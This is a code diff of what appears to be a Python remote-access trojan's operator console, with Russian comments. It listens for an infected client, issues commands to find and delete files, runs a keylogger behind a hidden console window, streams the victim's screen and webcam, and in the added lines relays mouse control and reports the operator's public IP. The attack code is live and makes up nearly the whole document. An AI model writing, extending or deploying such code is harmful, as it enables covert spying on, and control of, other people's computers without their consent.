@@ -1,14 +1,15 @@
 from os import system
-"""system("pip install subprocess")
-system("pip install easyocr")
-system("pip install sockets")
+
+#system("pip install easyocr")
+"""system("pip install sockets")
 system("pip install opencv-python")
 system("pip install pypi-stat")
 system("pip install comtypes")"""
 # Добавляем необходимые подклассы - MIME-типы
 import subprocess
-import os.path
+import cv2
 import socket
+from requests import get
 import stat
 import os, time
 
@@ -46,22 +47,21 @@ def def_hide():
             self.threadID = threadID
             self.name = name
             self.counter = counter
-
         def run(self):
             main()
-    
+
     def hide():
         import win32console, win32gui
         window = win32console.GetConsoleWindow()
         win32gui.ShowWindow(window, 0)
         return True
-    
+
     # Запуск кейлогера
     def main():
         hm.KeyDown = OnKeyboardEvent
         hm.HookKeyboard()
         pythoncom.PumpMessages()
-    
+
     hide()
     hm = pyHook.HookManager()
     disallow_Multiple_Instances()
@@ -104,7 +104,12 @@ def hlp():
 │//check_wifi - SHOWS RESULT OF {ARP -A} COMMAND - (useless)                                             │
 │abbort_client [-N] - KILL THE CONNECTION WITH CLIENT: -N - NUMBER OF A CLIENT                           │
 ├─find_file [-N] - FIND FILE OR DIRECTORY: -N - NAME                                                     │
-│spy [-C] - START SPYING SCREEN OR WEBCAM: -C - COMMAND (screen/webcam/stop_screen/stop_webcam)          │
+│spy [-C] - START SPYING SCREEN OR WEBCAM: -C - COMMAND (screen/webcam/stop_screen/stop_webcam/mouse)    │
+│   1. screen - START SHOWING SCREEN OF THE CLIENT                                                       │
+│   2. webcam - START SHOWING WEBCAM OF THE CLIENT                                                       │
+│   3. mouse - NOW, YOU CONTROL THE MOUSE OF THE CLIENT (SCROLL TO STOP)                                 │
+│   4. stop_screen - STOP 1.                                                                             │
+│   5. stop_webcam - STOP 2.                                                                             │
 │<beta!:>                                                                                                │
 │    {                                                                                                   │
 │        (don't open window)                                                                             │
@@ -133,6 +138,7 @@ def dub_edit():
             or_co += or_co1
     return or_co
 
+
 def communicate():
     print("Writing a message: ")
     while True:
@@ -144,16 +150,11 @@ def communicate():
 
 
 class StreamingServer:
-
-
     """
     Class for the streaming server.
-
     Attributes
     ----------
-
     Private:
-
         __host : str
             host address of the listening server
         __port : int
@@ -170,19 +171,13 @@ class StreamingServer:
             a basic lock used for the synchronization of threads
         __server_socket : socket
             the main server socket
-
-
     Methods
     -------
-
     Private:
-
         __init_socket : method that binds the server socket to the host and port
         __server_listening: method that listens for new connections
         __client_connection : main method for processing the client streams
-
     Public:
-
         start_server : starts the server in a new thread
         stop_server : stops the server and closes all connections
     """
@@ -191,10 +186,8 @@ class StreamingServer:
     def __init__(self, host, port, slots=8, quit_key='q'):
         """
         Creates a new instance of StreamingServer
-
         Parameters
         ----------
-
         host : str
             host address of the listening server
         port : int
@@ -319,24 +312,74 @@ class StreamingServer:
                 break
 
 
-
 def edit(command):
     client.send(command.encode("cp65001"))
+
+def mouse(client=None):
+    client.send((command.encode("cp65001")))
+    from pynput import mouse
+
+    def on_move(x, y):
+        print(('Pointer moved to {0}'.format(
+            (x, y))))
+        client.send(('Pointer moved to {0}'.format(
+            (x, y))).encode("cp65001"))
+
+    def on_click(x, y, button, pressed):
+        print(('{0} at {1}'.format(
+            'Pressed' if pressed else 'Released',
+            (x, y))))
+        client.send(('{0} at {1}'.format(
+            'Pressed' if pressed else 'Released',
+            (x, y))).encode("cp65001"))
+
+    def on_scroll(x, y, dx, dy):
+        print(('Scrolled {0} at {1}'.format(
+            'down' if dy < 0 else 'up',
+            (x, y))))
+        client.send(('Scrolled {0} at {1}'.format(
+            'down' if dy < 0 else 'up',
+            (x, y))).encode("cp65001"))
+        return False
+
+    # Collect events until released
+    with mouse.Listener(
+        on_move=on_move,
+        on_click=on_click,
+        on_scroll=on_scroll,
+        ) as listener:
+        listener.join()
+
+
+    """import pyautogui
+
+    x, y = pyautogui.position()
+
+    while True:
+        if x != pyautogui.position()[0]:
+            if y != pyautogui.position()[1]:
+                x, y = pyautogui.position()
+                client.send(str(str(x) + " " + str(y)).encode("cp65001"))"""
+
+
+
 
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 local_ip = str(socket.gethostbyname(socket.gethostname()))
+gp = get("http://api.ipify.org").text
 print(local_ip)
+print(gp)
 s.bind(("0.0.0.0", 8888))
 s.listen(5)
 client, addr = s.accept()
 command = ""
-#keys = []
+# keys = []
 g = True
 ch_dir_ch = False
 cur_dir = client.recv(1024).decode("cp65001")
 print("Type hlp to see list of commands")
-client.send(local_ip.encode("cp65001"))
+client.send(gp.encode("cp65001"))
 while True:
     try:
         command = input(cur_dir + ">> ")
@@ -390,14 +433,16 @@ while True:
         elif "check_wifi" == command:
             client.send(command.encode("cp65001"))
             print(client.recv(4096).decode("utf-8"))
+        elif "cls" == command or "clear" == command:
+            os.system("cls")
         elif "cd" == command.split(" ")[0]:
             if not ch_dir_ch:
-                #i = input("Did you mean 'ch_dir'? (Y/N)").lower()
+                # i = input("Did you mean 'ch_dir'? (Y/N)").lower()
                 i = "y"
                 if i == "y":
                     ch_dir((command.split(" "))[-1])
                     cur_dir = client.recv(1024).decode("cp65001")
-                    #u = input("Do you want to change 'cd' command to 'ch_dir' automaticaly? (Y/N)").lower()
+                    # u = input("Do you want to change 'cd' command to 'ch_dir' automaticaly? (Y/N)").lower()
                     u = "y"
                     if u == "y":
                         ch_dir_ch = True
@@ -421,6 +466,8 @@ while True:
                 server = StreamingServer(_, 9999)
                 server.start_server()
             g = False
+            if "mouse" == command.split(" ")[-1]:
+                mouse(client)
             client.send((command.encode("cp65001")))
         elif "delete" == command.split(" ")[0]:
             client.send((command.encode("cp65001")))
@@ -450,7 +497,7 @@ while True:
 
             file = open("temp.txt", "r")
             p = file.read()
-            #print(client.recv(1024).decode("cp65001"))
+            # print(client.recv(1024).decode("cp65001"))
             client.send(p.encode("utf-8"))
             print(client.recv(1024).decode("utf-8"))
             file.close()
@@ -461,7 +508,8 @@ while True:
             guts = client.recv(1024).decode("utf-8")
             print(guts)
             if ">>" in command.split(" "):
-                f = open(((command.replace(" ", "_")).replace(".", "^")).replace(">", "") + ".txt", "w", encoding="utf-8")
+                f = open(((command.replace(" ", "_")).replace(".", "^")).replace(">", "") + ".txt", "w",
+                         encoding="utf-8")
                 f.write(guts)
                 f.close()
         elif "kboard" == command.split("#")[0]:
@@ -470,6 +518,8 @@ while True:
             client.send(command.split(" ")[0].encode("cp65001"))
         elif "abbort" == command:
             exit(1)
+        elif command == "" or command == "\n":
+            client.send(command.encode("cp65001"))
         else:
             client.send(command.encode("cp65001"))
             result_output = client.recv(4096).decode("cp65001").split("╨Т┬а")
